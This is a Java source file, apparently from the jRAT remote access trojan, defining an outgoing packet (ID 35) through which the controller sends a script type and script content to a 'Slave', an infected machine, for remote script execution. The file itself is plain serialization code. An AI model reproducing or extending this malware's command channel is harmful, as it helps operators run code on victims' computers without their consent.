package se.jrat.controller.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.script.Script;
import se.jrat.controller.Slave;


public class Packet35Script extends AbstractOutgoingPacket {

	private Script type;
	private String content;

	public Packet35Script(Script type, String content) {
		this.type = type;
		this.content = content;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(type.getIdentifier());
		slave.writeLine(content);
	}

	@Override
	public byte getPacketId() {
		return 35;
	}

}
